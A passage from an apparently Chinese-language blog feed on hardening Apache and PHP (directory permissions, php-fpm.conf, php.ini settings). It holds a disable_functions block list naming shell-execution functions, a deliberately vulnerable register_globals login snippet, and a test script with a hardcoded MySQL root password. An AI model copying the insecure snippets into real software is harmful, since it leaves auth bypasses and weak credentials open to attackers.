/usr/local/httpd/logs/bwapp-access_%Y%m%d.log&quot; combined env=!img</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure></p><p>0x11 尽可能控死网站目录权限,只让用户在上传目录中能写,其它的目录一律不让写,具体授权过程如下<code>/var/html/bwapp/bWAPP/</code>为网站根目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># chown -R root.root /var/html/bwapp/bWAPP/</span><br><span class="line"># find /var/html/bwapp/bWAPP -type f | xargs chmod 644</span><br><span class="line"># find /var/html/bwapp/bWAPP -type d | xargs chmod 755</span><br><span class="line"># mkdir /var/html/bwapp/bWAPP/&#123;upload,admin_login&#125; -p</span><br><span class="line"># chown -R httpd.httpd /var/html/bwapp/bWAPP/upload</span><br></pre></td></tr></table></figure></p><p>0x12 接着,禁止用户在上传目录中执行后端脚本,如<code>php</code>,实现方式有两种,个人更推荐后者</p><p>第一种,直接往客户端丢403,注意linux下大小写敏感,不然容易被bypass掉,所以这里要加上i,让其不区分大小写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;/var/html/bwapp/bWAPP/upload&quot;&gt;</span><br><span class="line">&lt;FilesMatch &quot;\.(?i:php|php3|php4|php5)$&quot;&gt;</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure></p><p>第二种,在上传目录中,让php直接以普通文本来解析,此时右键源代码,你会发现php压根就没被解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;/var/html/bwapp/bWAPP/upload&quot;&gt;</span><br><span class="line">    AddType text/html .php</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure></p><p>0x13 禁止用户直接从公网访问网站后台,只允许特定的内网ip段才能访问,对于其它的一些敏感目录,你都可以这么干<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;/var/html/bwapp/bWAPP/admin_login&quot;&gt;</span><br><span class="line">    Order deny,allow</span><br><span class="line">    allow from 192.168.3.0/24</span><br><span class="line">    deny from all</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure></p><p>0x14 防止发生解析漏洞,注意linux下大小写的问题,以防逃逸,只需要加到对应的网站目录配置下即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;/var/html/bwapp&quot;&gt;</span><br><span class="line">...</span><br><span class="line">&lt;Files ~ &quot;\.(php.|php3.|php4.|php5.)&quot;&gt;</span><br><span class="line">    Order Allow,Deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure></p><p>0x15 跟进apache官方发布的各类高危漏洞补丁,适时进行修补,另外,请把你用于测试的各类探针都收好,如,<code>phpinfo</code>之流,千万不要因为自己的粗心露点了…</p><p>0x16 更多,待续…</p><p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于apache,我想,到这里就不用再多说了吧,一个古董级的web服务,大家应该早都轻车熟路,我也就不多废话了,至于<code>LAMP架构</code>的加固,现在想必你也应该明白了,把<code>LNMP架构</code>的加固套过来即可,除了用的web服务不一样,PHP和Mysql的安全部署方式基本都是一模一样的,不一样的地方可能就在于对php的解析,不过都大同小异,换汤不换药,单单利用apache能做的防御毕竟很有限,但对付一般的<code>脚本小子</code>,这种防御早已绰绰有余,如果真的还有更高的安全要求,还是更推荐大家直接去深度定制各种开源或者商用WAF,另外,可以再针对性的写一些实时动态入侵预警脚本相互配合着使用,最近准备把针对各类基础服务的防入侵做成一个完整的系列,留作备忘,其实,也真的非常希望,有些厂商,能更有针对性的防,不要只为了赚钱而赚钱,废话到此为止吧,还没完,咱们待续…最后,也期待能与大家一起多交流 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 为防止配置或端口冲突,在装之前,你需要先仔细检查当前系统有没有装apache,如果有&lt;code&gt;先把apache服务停掉,然后卸载apache&lt;/code&gt;,等会儿用源码重新编译安装&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# rpm -qa httpd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# rpm -e --nodeps * 强制卸载apache&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;演示环境&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;CentOS6.8 x86_64    最小化,带基础库安装 eth0 : 192.168.3.45 eth1 : 192.168.4.16 eth2 : 192.168.5.16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;httpd-2.2.34.tar.gz apache官方提供的源码包&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 下载apache源码包,这里暂时选择2.2.x系列的最新版,不建议再用比这个还老的版本了,漏洞比较多&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# wget http://apache.website-solution.net/httpd/httpd-2.2.34.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# tar xf httpd-2.2.34.tar.gz &amp;amp;&amp;amp; cd httpd-2.2.34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x03 直接到源码中去&lt;code&gt;改掉apache的详细版本信息&lt;/code&gt;,跟部署nginx一样,尽可能地扰乱入侵者的判断,这里就把它模拟成IIS 7.5,实际系统应为win server 2008r2&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# vi include/ap_release.h&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="apachesec" scheme="https://evil-404.github.io/categories/apachesec/"/>
    
    
      <category term="apachesec" scheme="https://evil-404.github.io/tags/apachesec/"/>
    
  </entry>
  
  <entry>
    <title>php-fpm.conf &amp; php.ini 安全优化实践</title>
    <link href="https://evil-404.github.io/2017-11-24-phpsec.html"/>
    <id>https://evil-404.github.io/2017-11-24-phpsec.html</id>
    <published>2017-11-23T20:09:17.000Z</published>
    <updated>2017-12-24T13:07:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 关于 php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">其历史相对已经比较久远了,这里也就不废话了,属弱类型中一种解释型语言</span><br><span class="line">除了web开发以及写些简单的exp,暂未发现其它牛逼用途,暂以中小型web站点开发为主</span><br><span class="line">另外,低版本的php自身漏洞就比较多,建议,从现在开始就在新项目中使用php 5.6.x 往后的版本</span><br><span class="line">好在官方维护的一直比较勤奋,主次版本都迭代的比较快,最新版已经到7.2.0</span><br><span class="line">哼哼……是,&apos;最好的语言&apos;... :)</span><br></pre></td></tr></table></figure></p><p>0x02 此次演示环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CentOS6.8 x86_64   最小化,带基础库安装 eth0: 192.168.3.42 eth1: 192.168.4.14  eth2: 192.168.5.14</span><br><span class="line">php-5.6.32.tar.gz  官方提供的源码包</span><br></pre></td></tr></table></figure></p><p>0x03 下载 <code>php-5.6.32.tar.gz</code>,并安装好php所需的各种依赖库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># yum install epel-release -y</span><br><span class="line"># yum install -y zlib-devel libxml2-devel freetype-devel </span><br><span class="line"># yum install -y libjpeg-devel  libpng-devel gd-devel curl-devel libxslt-devel</span><br><span class="line"># yum install openssl openssl-devel libmcrypt libmcrypt-devel mcrypt mhash mhash-devel -y</span><br><span class="line"># tar xf libiconv-1.15.tar.gz</span><br><span class="line"># cd libiconv-1.15</span><br><span class="line"># ./configure --prefix=/usr/local/libiconv-1.15 &amp;&amp; make &amp;&amp; make install</span><br><span class="line"># ln -s /usr/local/libiconv-1.15/ /usr/local/libiconv</span><br><span class="line"># ll /usr/local/libiconv/</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>0x04 开始编译安装php5.6.32,要带的编译参数比较多,大家下去以后,可以仔细了解下这些参数都是干什么用的,其实,都是一些php内置功能模块,这里默认就已经启用了一些比较常用的模块,如,pdo,mysqli,关于下面的模块,并不用全部都装,根据你自己实际的开发业务需求,用什么装什么即可,切记,不要一上来不管用不用就先装一大堆,你不用,很可能就会被别人利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># wget http://au1.php.net/distributions/php-5.6.32.tar.gz</span><br><span class="line"># tar xf php-5.6.32.tar.gz</span><br><span class="line"># cd php-5.6.32</span><br><span class="line"># ./configure --help</span><br><span class="line"># ./configure \</span><br><span class="line">--prefix=/usr/local/php-5.6.32 \</span><br><span class="line">--with-config-file-path=/usr/local/php-5.6.32/etc \</span><br><span class="line">--with-mysql=/usr/local/mysql \</span><br><span class="line">--with-mysqli=/usr/local/mysql/bin/mysql_config \</span><br><span class="line">--with-pdo-mysql=/usr/local/mysql \</span><br><span class="line">--with-iconv-dir=/usr/local/libiconv \</span><br><span class="line">--with-freetype-dir \</span><br><span class="line">--with-jpeg-dir \</span><br><span class="line">--with-png-dir \</span><br><span class="line">--with-zlib \</span><br><span class="line">--with-libxml-dir=/usr \</span><br><span class="line">--with-curl \</span><br><span class="line">--with-mcrypt \</span><br><span class="line">--with-gd \</span><br><span class="line">--with-openssl \</span><br><span class="line">--with-mhash \</span><br><span class="line">--with-xmlrpc \</span><br><span class="line">--with-xsl \</span><br><span class="line">--with-fpm-user=nginx \</span><br><span class="line">--with-fpm-group=nginx \</span><br><span class="line">--enable-xml \</span><br><span class="line">--disable-rpath \</span><br><span class="line">--enable-bcmath \</span><br><span class="line">--enable-shmop \</span><br><span class="line">--enable-sysvsem \</span><br><span class="line">--enable-inline-optimization \</span><br><span class="line">--enable-mbregex \</span><br><span class="line">--enable-fpm \</span><br><span class="line">--enable-mbstring \</span><br><span class="line">--enable-gd-native-ttf \</span><br><span class="line">--enable-pcntl \</span><br><span class="line">--enable-sockets \</span><br><span class="line">--enable-soap \</span><br><span class="line">--enable-short-tags \</span><br><span class="line">--enable-static \</span><br><span class="line">--enable-ftp \</span><br><span class="line">--enable-opcache=no</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># make &amp;&amp; make install</span><br><span class="line"># ln -s /usr/local/php-5.6.32/ /usr/local/php</span><br><span class="line"># cp php.ini-production /usr/local/php/etc/php.ini创建php解释器的配置文件</span><br></pre></td></tr></table></figure><p>0x05 编辑,配置并优化<code>php-fpm.conf</code>,即 <code>fastcgi 的服务端</code>,如下</p><p>让php进程以一个系统伪用户的身份起来,在能满足实际业务需求的情况下,最大程度上降低php进程权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># useradd -s /sbin/nologin -M phpfpm</span><br><span class="line"># cp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf</span><br><span class="line"># vi /usr/local/php/etc/php-fpm.conf</span><br><span class="line"># mkdir /usr/local/php/logs</span><br><span class="line"># egrep -v &quot;^$|;&quot; /usr/local/php/etc/php-fpm.conf简化php-fpm配置文件</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># php-fpm 的全局配置模块</span><br><span class="line">[global]</span><br><span class="line"></span><br><span class="line"># 指定php-fpm的进程id号文件存放位置</span><br><span class="line">pid = /usr/local/php/logs/php-fpm.pid</span><br><span class="line"></span><br><span class="line"># 指定php-fpm进程自身的错误日志存放位置</span><br><span class="line">error_log = /usr/local/php/logs/php-fpm.log</span><br><span class="line"></span><br><span class="line"># 指定要记录的php-fpm日志级别</span><br><span class="line">log_level = error</span><br><span class="line">rlimit_files = 32768</span><br><span class="line">events.mechanism = epoll</span><br><span class="line"></span><br><span class="line"># php-fpm web配置模块</span><br><span class="line">[www]</span><br><span class="line"></span><br><span class="line"># 最好把web服务用户和php-fpm进程用户的权限分开,分别用两个完全不同的系统伪用户来跑对应的服务,防止意外的越权行为</span><br><span class="line"># 其实,你也可以不分开,特定条件下,关系也并不是非常大,不过,个人建议,最好还是分开</span><br><span class="line">user = phpfpm</span><br><span class="line">group = phpfpm</span><br><span class="line"></span><br><span class="line"># 务必要监听在127.0.0.1的9000端口,另外,该端口严禁对外开放,防止别人通过fastcgi进行包含</span><br><span class="line">listen = 127.0.0.1:9000</span><br><span class="line">listen.owner = phpfpm</span><br><span class="line">listen.group = phpfpm</span><br><span class="line"></span><br><span class="line">pm = dynamic</span><br><span class="line">pm.max_children = 1024</span><br><span class="line">pm.start_servers = 16</span><br><span class="line">pm.min_spare_servers = 5</span><br><span class="line">pm.max_spare_servers = 20</span><br><span class="line">pm.max_requests = 2048</span><br><span class="line">slowlog = /usr/local/php/logs/$pool.log.slow</span><br><span class="line">request_slowlog_timeout = 10</span><br><span class="line">php_admin_value[sendmail_path] = /usr/sbin/sendmail -t -i -f klion@protonmail.com</span><br><span class="line"></span><br><span class="line"># 只让为php的后缀执行,一般这里还有`.php3 .php4 .php5`,把那些默认给的可执行后缀统统去掉,只留`.php`即可</span><br><span class="line"># 一般会配合php.ini文件中的cgi.fix_pathinfo参数一起使用,避免入侵者构造利用解析漏洞进行上传</span><br><span class="line">security.limit_extensions = .php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># /usr/local/php/sbin/php-fpm启动php-fpm</span><br><span class="line"># ps -le | grep &quot;php-fpm&quot;</span><br><span class="line"># netstat -tulnp | grep &quot;:9000&quot;</span><br><span class="line"># echo &quot;/usr/local/php/sbin/php-fpm&quot; &gt;&gt; /etc/rc.local &amp;&amp; cat /etc/rc.local</span><br><span class="line"># killall php-fpm 如果想关闭php-fpm,直接把它进程kill掉即可</span><br></pre></td></tr></table></figure><p>尝试让php与mysql,nginx 进行联动,看看php能不能被正常解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi connect.php</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$link = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;admin&quot;) or die(mysql_error());</span><br><span class="line">if($link)&#123;</span><br><span class="line">echo &quot;yeah , mysql connect succeed!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo mysql_error();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>0x06 最后,我们就来好好关注下php解析器自身的安全,php解析器的设置全部依靠<code>php.ini</code>文件来实现,所以,下面就来详细说明一下针对<code>php.ini的安全配置</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/php/etc/php.ini</span><br></pre></td></tr></table></figure></p><p>将 <code>register_globals 项设为Off</code>,本身的意思就是注册为全局变量,也就是说,设置为On的时候,从客户端传过来的参数值会被直接注册到php全局变量中,在后端可以直接拿到该变量到脚本中使用,如果为Off,则表示只能到特定的全局数组中才能取到该数据,建议关闭,容易造成变量覆盖问题,不过在php高版本中 <code>如,&gt; 5.6.x</code>,已经去除对此项的设置,官方给的说明是这样的<code>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除</code>,如果你用的还是低版本的php就需要注意把此项关闭<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register_globals = Off</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($mark)&#123;</span><br><span class="line">echo &quot;login succeed! &quot;;# 此处会直接显示登陆成功,因事先没有定义$mark,导致$mark直接被覆盖掉了</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;login failed!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将 <code>cgi.fix_pathinfo的值设为 0</code>,默认cgi.fix_pathinfo 项是开启的,即值为1,它会对文件路径自动进行修正,我们要把它改成0,不要让php自动修正文件路径,防止入侵者利用此特性构造解析漏洞来配合上传webshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgi.fix_pathinfo = 0</span><br></pre></td></tr></table></figure></p><p>建议同时关闭以下两项,如果实在有业务需求,请在代码中严格限制检查用户传过来的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 为On时,则表示允许,也就是说,此时可以通过file_get_contents(),include(),require()等函数直接从远端获取数据</span><br><span class="line"># 容易造成任意文件读取和包含问题,注意,此项默认就是开启的</span><br><span class="line">allow_url_fopen = Off</span><br><span class="line"></span><br><span class="line"># 容易造成远程包含,强烈建议关闭此项</span><br><span class="line">allow_url_include = Off</span><br></pre></td></tr></table></figure></p><p><code>禁用各种高危函数</code>,尽可能让各种 webshell <code>[ 一句话,大马 ]</code> 无法再靠php内置函数来执行各种系统命令,<code>说实话,禁用这些函数也并不能很好的防住什么,利用各种拆分拼装变形,依然很容易逃逸</code>,下面是一些比较常见的命令和代码执行函数,如果你还发现有其它的一些不常用的高危函数,也可以一并加进来,防止被入侵者率先发现并利用,此项默认为空,即关闭,另外,并不是下面所有的函数都一定要禁用掉,务必要根据自己实际的开发业务来进行,实在用不到的,也没必要让它留着,因为有些函数,开发可能会用,所以也不能盲注的去禁用,那就只能靠在代码中做更为严格的检查,中间的利害还要靠大家自己去定夺,这里仅仅只是个参考<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions = dl,eval,assert,popen,proc_close,gzinflate,str_rot13,base64_decode,exec,system,ini_alter,readlink,symlink,leak,proc_open,pope,passthru,chroot,scandir,chgrp,chown,escapeshellcmd,escapeshellarg,shell_exec,proc_get_status,max_execution_time,opendir,readdir,chdir,dir,unlink,delete,copy,rename,ini_set</span><br></pre></td></tr></table></figure></p><p><code>转义开关</code>,主要用来转义各种特殊字符,如,<code>单引号,双引号,反斜线和空字符...</code>个人建议,在这里先把它关闭,因为它并不能很好的防住sql注入,或者说,基本是防不住的,比如,利用宽字节 <code>说到这儿,顺便再补充一句,对付宽字节的最好办法就是全站统一使用 utf-8</code>,这里还是建议大家采用sql语句预编译和绑定变量的方式来预防sql注入,这也是目前为止比较切实有效的预防手段,对于从客户端过来的各种其它数据,可以单独写个检查类,如果你想安全就不要对这些开关寄予太大的希望,可能php官方也发现,这个开关实质就是个摆设,所以给出了这样的说明<code>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc = Off</span><br><span class="line">magic_quotes_runtime = Off</span><br></pre></td></tr></table></figure></p><p><code>关闭php自身的各种错误回显</code>,反正只要记得,在项目上线后,所有的程序错误一律接收到我们自己事先准备好的地方<code>[一般是日志]</code>,一旦被入侵者在前端看到,极易造成敏感信息泄露,高版本的php,默认这些危险项就是处于关闭状态的,另外,有条件的情况下<code>务必把线上环境和测试开发环境隔离</code>,不要把过多希望寄托于程序员,毕竟,你我都知道,那是根本不靠谱的 ^_^<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">display_errors = Off# 切记千万不让让php错误输出到前端页面上</span><br><span class="line">error_reporting = E_WARING &amp; ERROR# 设置php的错误报告级别,只需要报告警告和错误即可</span><br><span class="line">log_errors = On  # 开启php错误日志记录</span><br><span class="line">error_log = /usr/local/php/logs/php_errors.log# 指定php错误日志存放位置</span><br><span class="line">log_errors_max_len = 2048  # 指定php错误日志的最大长度</span><br><span class="line">ignore_repeated_errors = Off # 不要忽略重复的错误</span><br><span class="line">display_startup_errors = Off # 另外,不要把php启动过程中的错误输出到前端页面上</span><br></pre></td></tr></table></figure></p><p><code>隐藏php的详细版本号</code>,即<code>X-Powered-By</code>中显示的内容,不得不再次强调,有些漏洞只能针对特定的类型版本,在实际渗透过程中,如果让入侵者看到详细的版本号,他很可能就会直接去尝试利用该版本所具有的一些漏洞特性再配合着其它漏洞一起使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expose_php = Off</span><br></pre></td></tr></table></figure></p><p><code>限制php对本地文件系统的访问</code>,即把所有的文件操作都限制指定的目录下,让php其实就是限制了像<code>fopen()</code>这类函数的访问范围,一般主要用来防止旁站跨目录,把webshell死死控制在当前站点目录下,此项默认为空,不建议直接写到php.ini中,可以参考前面nginx安全部署中的,直接在每个站点目录下新建一个<code>.user.ini</code>然后再把下面的配置写进去即可,这样相对比较灵活<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir = &quot;/usr/local/nginx/html/bwapp/bWAPP:/usr/local/nginx/html/dvws/&quot;</span><br></pre></td></tr></table></figure></p><p>关于<code>对服务端session的一些安全处理方式</code></p><p>隐藏后端使用的真正脚本类型,扰乱入侵者的渗透思路,另外,切记不要把敏感数据直接明文存在session中,有泄露风险<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.name = JSESSIONID表示jsp程序,php的则是PHPSESSID</span><br></pre></td></tr></table></figure></p><p>修改session文件存放路径,最好不要直接放在默认的<code>/tmp</code>目录下,实际中可能是一台单独的session服务器,比如,memcached<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.save_handler = memcache</span><br><span class="line">session.save_path = &quot;tcp://192.168.3.42:11211&quot;</span><br></pre></td></tr></table></figure></p><p><code>安全模式</code>可根据实际业务需求选择性开启,安全模式的意思就是操作文件的函数只能操作与php进程UID相同的文件,但php进程的uid并不一定就是web服务用户的uid,这也就造成了麻烦,也就是说,你想避免这种麻烦,可能就需要在最开始配置时就让php进程和web服务使用同一个系统用户身份,但这又正好跟我前面说的相背了,我们在前面说过,最好把php进程用户和web服务用户分开,这样更容易进行权限控制,另外,高版本的php<code>[ &gt; php5.4 ]</code>已不再支持安全模式,因为官方可能也觉得它并没什么卵用,而且低版本php的安全模式,还可被绕过,所以,如果你用的是低版本的php,请根据自身实际业务做取舍<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">safe_mode = On</span><br><span class="line">safe_mode_gid = off</span><br></pre></td></tr></table></figure></p><p>限制php单脚本执行时长,防止服务器资源被长期滥用而产生拒绝服务的效果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">max_execution_time = 30</span><br><span class="line">max_input_time = 60</span><br><span class="line">memory_limit = 8M</span><br></pre></td></tr></table></figure></p><p>关于上传,如果实际的业务根本不涉及到上传,直接把上传功能关掉即可,如果需要上传,再根据需求做出调整即可,对防入侵来讲,这里对我们意义并不是非常大<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_uploads = On# 开启php上传功能</span><br><span class="line">upload_tmp_dir =# 文件传上来的临时存放目录</span><br><span class="line">upload_max_filesize = 8M# 